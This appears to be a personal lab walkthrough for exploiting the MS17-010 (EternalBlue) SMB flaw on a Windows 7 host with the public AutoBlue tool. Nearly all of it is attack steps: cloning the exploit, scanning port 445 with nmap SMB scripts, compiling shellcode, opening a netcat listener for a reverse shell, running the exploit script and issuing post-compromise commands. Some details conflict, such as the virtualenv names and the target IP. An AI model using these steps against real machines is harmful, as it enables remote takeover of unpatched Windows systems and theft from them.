1. Clone the Repo:
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git  
gh repo clone 3ndG4me/AutoBlue-MS17-010



```
cd /to the dir whre you have requirements.txt/
virtualenv venv1   
source venv/bin/activate
pip install -r requirements.txt
pip list ##to see the list of packages installed.

```

Now take a look at the shellcode.sh this will generate the shellcode.
Now before we do this lets check if the target is vuln or not?

use namp
```
sudo nmap -sV -p 445 -O 10.0.2.5
-- target is win 7
ls -la /usr/share/nmap/scripts | grep smb-

--let's see if this target is vuln to smb- script
nmap -sV -p 445 -O --script=smb- 10.0.2.5 
```

```
chmod 777 shell_prep.sh
./shell_prep.sh

---------------------------------------------------------------------------------
┌──(venv1)─(root㉿kali)-[/home/…/git_clones/metasploit_1_eternablue_manual_git/AutoBlue-MS17-010-master/shellcode]
└─# ./shell_prep.sh 
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

```
we're not doing the listner.py as we're using the cmd here for shell

Make the .py file executable.
```
--Another shell:
nc -nvlp 4444
--main shell
python eternalblue_exploit7.py 10.0.2.6 shellcode/sc_x64.bin 
```

    net user
    systeminfo
    getuid
    upload /home/kali/file.txt C:\to the desired file location on win\
Done!
